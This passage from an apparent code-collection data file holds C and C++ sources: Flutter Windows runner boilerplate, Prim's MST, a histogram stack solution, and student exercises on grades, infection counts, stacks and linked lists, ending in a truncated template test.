Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <limits.h>\r\n#include <stdbool.h>\r\n#include <stdio.h>\r\n// Number of vertices in the graph\r\n#define V 5\r\n// A utility function to find the vertex with\r\n\r\n// minimum key value, from the set of vertices\r\n// not yet included in MST\r\nint minKey(int key[], bool mstSet[])\r\n{\r\n// Initialize min value\r\nint min = INT_MAX, min_index;\r\nfor (int v = 0; v < V; v++)\r\nif (mstSet[v] == false && key[v] < min)\r\nmin = key[v], min_index = v;\r\nreturn min_index;\r\n}\r\n// A utility function to print the\r\n// constructed MST stored in parent[]\r\nint printMST(int parent[], int graph[V][V])\r\n{\r\nprintf(\"Edge \\tWeight\\n\");\r\nfor (int i = 1; i < V; i++)\r\nprintf(\"%d - %d \\t%d \\n\", parent[i], i,\r\ngraph[i][parent[i]]);\r\n}\r\n// Function to construct and print MST for\r\n// a graph represented using adjacency\r\n// matrix representation\r\nvoid primMST(int graph[V][V])\r\n{\r\n// Array to store constructed MST\r\nint parent[V];\r\n// Key values used to pick minimum weight edge in cut\r\nint key[V];\r\n// To represent set of vertices included in MST\r\n\r\nbool mstSet[V];\r\n// Initialize all keys as INFINITE\r\nfor (int i = 0; i < V; i++)\r\nkey[i] = INT_MAX, mstSet[i] = false;\r\n// Always include first 1st vertex in MST.\r\n// Make key 0 so that this vertex is picked as first\r\n// vertex.\r\nkey[0] = 0;\r\n// First node is always root of MST\r\nparent[0] = -1;\r\n// The MST will have V vertices\r\nfor (int count = 0; count < V - 1; count++) {\r\n// Pick the minimum key vertex from the\r\n// set of vertices not yet included in MST\r\nint u = minKey(key, mstSet);\r\n// Add the picked vertex to the MST Set\r\nmstSet[u] = true;\r\n// Update key value and parent index of\r\n// the adjacent vertices of the picked vertex.\r\n// Consider only those vertices which are not\r\n// yet included in MST\r\nfor (int v = 0; v < V; v++)\r\n// graph[u][v] is non zero only for adjacent\r\n// vertices of m mstSet[v] is false for vertices\r\n// not yet included in MST Update the key only\r\n// if graph[u][v] is smaller than key[v]\r\nif (graph[u][v] && mstSet[v] == false\r\n&& graph[u][v] < key[v])\r\nparent[v] = u, key[v] = graph[u][v];\r\n\r\n}\r\n// print the constructed MST\r\nprintMST(parent, graph);\r\n}\r\n// Driver's code\r\nint main()\r\n{\r\nint graph[V][V] = { { 0, 2, 0, 6, 0 },\r\n{ 2, 0, 3, 8, 5 },\r\n{ 0, 3, 0, 0, 7 },\r\n{ 6, 8, 0, 0, 9 },\r\n{ 0, 5, 7, 9, 0 } };\r\n// Print the solution\r\nprimMST(graph);\r\nreturn 0;\r\n}\r\n\r\n",
    "#include <iostream>\r\n#include <stack>\r\nusing namespace std;\r\n\r\nint main(){\r\n    ios::sync_with_stdio(false); cin.tie(NULL); cout.tie(NULL);\r\n    stack <pair<long long,pair<long long,int>>> st;//\ud569,(\uac12,\uc778\ub371\uc2a4)\r\n    int n;\r\n    long long input = 0LL, res = 0LL;\r\n    cin >> n;\r\n    for(int i = 0;i<n;i++){\r\n        cin >> input;\r\n        if(!st.empty()){\r\n            if(st.top().second.first < input){\r\n                st.push({input,{input,i}});\r\n            }else{\r\n                int idx;//\ud0d1\uc758 \uc778\ub371\uc2a4\uac12\r\n                while(!st.empty() && st.top().second.first > input){//\uc774 \ubd80\ubd84\uc774 \uc911\uc694\ud558\ub2e4.\r\n                    st.top().first = (i-st.top().second.second)*st.top().second.first;//\ud0d1\uc758 \ub113\uc774\ub97c \uac31\uc2e0\uc2dc\ucf1c\uc900\ub2e4.\r\n                    //\ub108\ube44 \uac12\uc740 i-1\ubd80\ud130 st.top().second.second\uae4c\uc9c0\uc774\ubbc0\ub85c \uc0ac\uc2e4\uc0c1 \uc544\ub798 \uacf5\uc2dd\uc744 \uc801\uc6a9\ud55c \uacb0\uacfc\uac00 \uc800\uac70\ub2e4.\r\n                    res = (st.top().first>res)?st.top().first:res;\r\n                    idx = st.top().second.second;//\ud0d1\uc758 \uc778\ub371\uc2a4 \uac12\uc744 \uc800\uc7a5\ud558\uc5ec \ub098\uc911\uc5d0 \ud0d1\uc774 \ub354 \uc791\uc740 \uacbd\uc6b0\ub97c \ucc3e\uc558\uc744 \ub54c \ub113\uc774\ub97c \uad6c\ud558\ub294 \ub370 \uc4f0\uc778\ub2e4.\r\n                    st.pop();\r\n                }\r\n                if(!st.empty()){\r\n                    if(st.top().second.first == input){\r\n                        st.top().first = (i-st.top().second.second+1)*input;\r\n                    }else{\r\n                        st.push({input*(i-idx+1),{input,idx}});//1\uc744 \ub354\ud55c \uc774\uc720\ub294 idx\uac00 \uc608\uc804 \ud0d1 \uc778\ub371\uc2a4\uc774\uae30 \ub54c\ubb38. \r\n                    }\r\n                }else{\r\n                    st.push({input,{input,0}});\r\n                    //i\ub97c \ub123\ub098 0\uc744 \ub123\ub098 \ubb54 \ucc28\uc774\uc778\uc9c0...\r\n                    // 0\uc744 \ub123\ub294\uac8c \ub9de\uc744 \ub4ef? \uc65c\ub0d0\uba74 0\uc744 \ub123\uc5b4\uc57c \ud574\ub2f9 \ub192\uc774\uc758 \ub113\uc774\ub97c \uc81c\ub300\ub85c \uad6c\ud560 \uc218 \uc788\uc74c.\r\n                }\r\n            }\r\n        }else{\r\n            st.push({input,{input,i}});\r\n        }\r\n    }\r\n    while(!st.empty()){\r\n        st.top().first = (n-st.top().second.second)*st.top().second.first;\r\n        res = (st.top().first>res)?st.top().first:res;\r\n        st.pop();\r\n    }\r\n    cout << res;\r\n}   \r\n/*\r\n\ud480\ub2e4\uac00 \uc0ac\uc2e4 \uae30\uc5b5 \uc798 \uc548\ub098\uc11c \ud788\uc2a4\ud1a0\uadf8\ub7a8 \ud480\uc774 \ucc38\uace0\ud558\uba74\uc11c \ud480\uc5c8\ub2e4.\r\ntop\uac12\ubcf4\ub2e4 \ub354 \ud070 \uac12\uc774 \ub4e4\uc5b4\uc624\uba74 \ub2e8\uc21c \uc0bd\uc785\r\ntop\uac12\ubcf4\ub2e4 \ub354 \uc791\uc740 \uac12\uc774 \ub4e4\uc5b4\uc624\uba74 \uc791\uc740 \uac12\uc744 \ucc3e\uc744\ub54c\uae4c\uc9c0 \uc81c\uac70\r\n*/\r\n",
    "#include <stdio.h>\r\n\r\nstruct ders {\r\n    int ders_kod;\r\n    int vize;\r\n    int final;\r\n    double gecmenotu;\r\n};\r\n\r\nstruct sahis_bilgileri {\r\n    char ad[40];\r\n    char soyad[40];\r\n    int No;\r\n    struct ders dersler[5];\r\n};\r\n\r\nvoid ogrenciBilgileriAl(struct sahis_bilgileri *ogrenci) {\r\n    printf(\"Ogrenci adi: \");\r\n    scanf(\"%s\", ogrenci->ad);\r\n\r\n    printf(\"Ogrenci soyadi: \");\r\n    scanf(\"%s\", ogrenci->soyad);\r\n\r\n    printf(\"Ogrenci No: \");\r\n    scanf(\"%d\", &ogrenci->No);\r\n\r\n    for (int i = 0; i < 5; ++i) {\r\n        printf(\"Ders kodu: \");\r\n        scanf(\"%d\", &ogrenci->dersler[i].ders_kod);\r\n\r\n        printf(\"Vize notu: \");\r\n        scanf(\"%d\", &ogrenci->dersler[i].vize);\r\n\r\n        printf(\"Final notu: \");\r\n        scanf(\"%d\", &ogrenci->dersler[i].final);\r\n\r\n        \r\n        ogrenci->dersler[i].gecmenotu = 0.4 * ogrenci->dersler[i].vize + 0.6 * ogrenci->dersler[i].final;\r\n    }\r\n}\r\n\r\nvoid ogrenciBilgileriYazdir(struct sahis_bilgileri ogrenci) {\r\n    printf(\"\\nOgrenci Bilgileri:\\n\");\r\n    printf(\"Ad: %s\\n\", ogrenci.ad);\r\n    printf(\"Soyad: %s\\n\", ogrenci.soyad);\r\n    printf(\"No: %d\\n\", ogrenci.No);\r\n\r\n    for (int i = 0; i < 5; ++i) {\r\n        printf(\"Ders Kodu: %d\\n\", ogrenci.dersler[i].ders_kod);\r\n        printf(\"Vize: %d\\n\", ogrenci.dersler[i].vize);\r\n        printf(\"Final: %d\\n\", ogrenci.dersler[i].final);\r\n        printf(\"Gecme Notu: %.2lf\\n\", ogrenci.dersler[i].gecmenotu);\r\n        printf(\"-----------------\\n\");\r\n    }\r\n}\r\n\r\nint main() {\r\n    struct sahis_bilgileri ogrenciler[5];\r\n\r\n    for (int i = 0; i < 5; ++i) {\r\n        ogrenciBilgileriAl(&ogrenciler[i]);\r\n    }\r\n\r\n    for (int i = 0; i < 5; ++i) {\r\n        ogrenciBilgileriYazdir(ogrenciler[i]);\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//A program that keeps track of the infected people around the world\r\n#include <iostream>\r\nusing namespace std;\r\nint main ()\r\n{\r\n\tint countries, infected;\r\n\tfloat sum, average;\r\n\r\n\t\r\n\tcout << \"This is a program that keeps track of the infected people around the world\" << endl << endl;\r\n\t\r\n\t\r\n\tcout << \"Enter the number of the countries: \"; // stores the number of countries (the number of times the loop will continue)\r\n\tcin >> countries;\r\n\t\r\n\t\t// create an array that stores each name of each country and the number of infected people in these countries\r\n\tstring array[countries];\r\n\tint arr[countries];\r\n\r\n\r\n\r\n\tfor (int i = 0; i < countries; i++)\r\n\t{\r\n\t\tcout << \"Enter name of country number \" << i + 1 << \" and the number of infected people in it: \";\r\n\t\tcin >> array[i];\r\n\t\tcin >> arr[i];\r\n\t\tcout << endl;\r\n\t\t\r\n    }\r\n\t\r\n\tcout << endl << endl;\r\n\r\n\r\n    // create a loop to be able to sum the total number of cases for all countries\r\n    for (int s = 0; s < countries; s++)\r\n    {\r\n    \tsum+=arr[s];\r\n\t}\r\n\tcout << \"The total number of infected cases for all countries is: \" << sum << endl;\r\n\t\r\n\t\r\n\t// get the average by dividing the sum of cases and the total number of values\r\n\taverage = sum/countries;\r\n\tcout << \"The average infections for all countries is: \" << average << endl;\r\n\t\r\n\tint max = arr[0];\r\n\t// create a loop to be able to find the highest number of infection\r\n    for(int m = 1; m < countries; m++)\r\n    {\r\n    \t\r\n\r\n       if(max < arr[m]) \r\n       {\r\n       \t  max = arr[m]; \r\n\t   }\r\n\r\n    }\r\n    cout << \"The highest number of infections is: \" << max; \r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nstruct no {\n  int info;\n  no *ptr_proximo_no;\n};\n\nstruct pilha {\n  no *ptr_topo;\n\n  void inicializar(){\n    ptr_topo = NULL;\n  }\n\n  void empilhar(int nova_info) {\n    no *ptr_novo_no;\n    ptr_novo_no = new no;\n    \n    ptr_novo_no->info = nova_info;\n    ptr_novo_no->ptr_proximo_no = NULL;\n\n    if (ptr_topo == NULL) {\n      ptr_topo = ptr_novo_no;\n    } else {\n      // Ligando o pr\u00f3ximo do novo n\u00f3 ao antigo topo\n      ptr_novo_no->ptr_proximo_no = ptr_topo;\n      // Atualizando o no que ficar\u00e1 no topo\n      ptr_topo = ptr_novo_no;\n    }\n  }\n\n  void desempilhar() {\n    if (ptr_topo == NULL) {\n      return;\n    }\n\n    no *ptr_temp;\n    ptr_temp = ptr_topo;\n\n    ptr_topo = ptr_temp->ptr_proximo_no;\n    delete ptr_temp;\n  }\n\n  void imprimir() {\n    no *ptr_no_atual;\n    ptr_no_atual = ptr_topo;\n\n    while (ptr_no_atual != NULL) {\n      cout << ptr_no_atual->info << endl;\n      ptr_no_atual = ptr_no_atual->ptr_proximo_no;\n    }\n  }\n};\n\nint main() {\n  pilha minha_pilha;\n  minha_pilha.inicializar();\n  minha_pilha.empilhar(45);\n  minha_pilha.empilhar(32);\n  minha_pilha.empilhar(84);\n  minha_pilha.desempilhar();\n  minha_pilha.imprimir();\n}",
    "#include <iostream>\n#include <locale.h>\n#include <string>\nusing namespace std;\n\nstruct Funcionario {\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n\tFuncionario *prox;\n};\n\nFuncionario* init() {\n\treturn NULL;\n}\n\nbool isEmpty(Funcionario* lista) {\n\treturn (lista == NULL);\n}\n\nFuncionario* insert(Funcionario* lista, int prontuario, string nome, double salario) {\n\tFuncionario* novo = new Funcionario();\n\tnovo->prontuario = prontuario;\n\tnovo->nome = nome;\n\tnovo->salario = salario;\n\tnovo->prox = lista;\n\treturn novo;\n};\n\nvoid printLista(Funcionario* lista) {\n\tFuncionario* aux;\n\tstring line(20, '-');\n\taux = lista;\n\tdouble totalSalarios = 0;\n\tif (isEmpty(lista)) {\n\t\tcout << \"Lista vazia.\" << endl;\n\t} else {\n\t\tcout << \"Lista de funcion\u00e1rios: \\n\" << endl;\n\t\tcout << line << endl;\n\t\twhile (aux != NULL) {\n\t\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t\t\tcout << line << endl;\n\t\t\ttotalSalarios = totalSalarios + aux->salario;\n\t\t\taux = aux->prox;\n\t\t}\n\t\tcout << \"\\nTotal de sal\u00e1rios: \" << totalSalarios << endl;\n\t\tcout << \"\\nFim da lista.\" << endl;\n\t}\n}\n\nvoid printFuncionario(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\tif (aux) {\n\t\tcout << \"\\nFuncion\u00e1rio encontrado: \" << endl;\n\t\tcout << endl;\n\t\tcout << \"Prontu\u00e1rio: \" << aux->prontuario << endl;\n\t\tcout << \"Nome: \" << aux->nome << endl;\n\t\tcout << \"Sal\u00e1rio: \" << aux->salario << endl;\n\t} else {\n\t\tcout << \"\\nFuncion\u00e1rio n\u00e3o encontrado.\" << endl;\n\t}\n}\n\nFuncionario* find(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\taux = aux->prox;\n\t}\n\treturn aux;\n}\n\nFuncionario* remove(Funcionario* lista, int prontuario) {\n\tFuncionario* aux;\n\tFuncionario* ant = NULL;\n\taux = lista;\n\n\twhile (aux != NULL && aux->prontuario != prontuario) {\n\t\tant = aux;\n\t\taux = aux->prox;\n\t}\n\n\tif (aux == NULL) {\n\t\treturn lista;\n\t}\n\n\tif (ant == NULL) {\n\t\tlista = aux->prox;\n\t}\n\n\telse {\n\t\tant->prox = aux->prox;\n\t}\n\n\tfree(aux);\n\treturn lista;\n}\n\nvoid freeLista(Funcionario* lista) {\n\tFuncionario* aux;\n\taux = lista;\n\twhile (aux != NULL) {\n\t\tFuncionario *ant = aux->prox;\n\t\tfree(aux);\n\t\taux = ant;\n\t}\t\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"\");\n\t\n  \tFuncionario *listaFuncionarios;\n\tlistaFuncionarios = init();\n\tint prontuario;\n\tstring nome;\n\tdouble salario;\n  \tint opcao;\n  \n  \tdo {\n\t\tstring line(40, '-');\n\t\tcout << \"0. Sair\\n\";\n\t\tcout << \"1. Incluir\\n\";\n\t\tcout << \"2. Excluir\\n\";\n\t\tcout << \"3. Pesquisar\\n\";\n\t\tcout << \"4. Listar\\n\";\n\t\tcout << \"Op\u00e7\u00e3o: \";\n\t\tcin >> opcao;\n\n    \t\tswitch (opcao) {\n\t\t\tcase 0:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Encerrando programa...\\n\";\n\t\t\t\tbreak;\n\t\t\t\n\t\t\tcase 1:\n\t\t\t\tcout << line << endl;\n        \t\t\tcout << \"Digite o prontuario: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tif (find(listaFuncionarios, prontuario)) {\n\t\t\t\t\tcout << \"Funcion\u00e1rio j\u00e1 cadastrado!\\n\";\n\t\t\t\t\tcout << line << endl;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcout << \"Digite o nome: \";\n\t\t\t\tcin >> nome;\n        \t\t\tcout << \"Digite o salario: \";\n\t\t\t\tcin >> salario;\n\t\t\t\tlistaFuncionarios = insert(listaFuncionarios, prontuario, nome, salario);\n        \t\t\tcout << \"Funcion\u00e1rio cadastrado com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 2:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser exclu\u00eddo: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tlistaFuncionarios = remove(listaFuncionarios, prontuario);\n\t\t\t\tcout << \"Funcion\u00e1rio exclu\u00eddo com sucesso!\" << endl;\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\t\t\t\n\t\t\tcase 3:\n\t\t\t\tcout << line << endl;\n\t\t\t\tcout << \"Digite o prontu\u00e1rio do funcion\u00e1rio a ser pesquisado: \";\n\t\t\t\tcin >> prontuario;\n\t\t\t\tprintFuncionario(listaFuncionarios, prontuario);\n\t\t\t\tcout << line << endl;\n\t\t\tbreak;\n\n\t\t\tcase 4:\n\t\t\t\tcout << line << endl;\n\t\t\t\tprintLista(listaFuncionarios);\n\t\t\t\tcout << line << endl;\n\t\t}  \t\n  } while (opcao != 0);\n\n\tfreeLista(listaFuncionarios);\n\n\treturn 0;\n}\n",
    "#include \"iter.hpp\"\n\nint main()\n{\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    int array[4] = {1, 2, 3, 4};\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n    iter(array, 4, increment);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST DOUBLE ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    double doubleArray[] = {1.5, 2.5, 3.5, 4.5, 5.5};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n    iter(doubleArray, 5, doubleNumber);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << 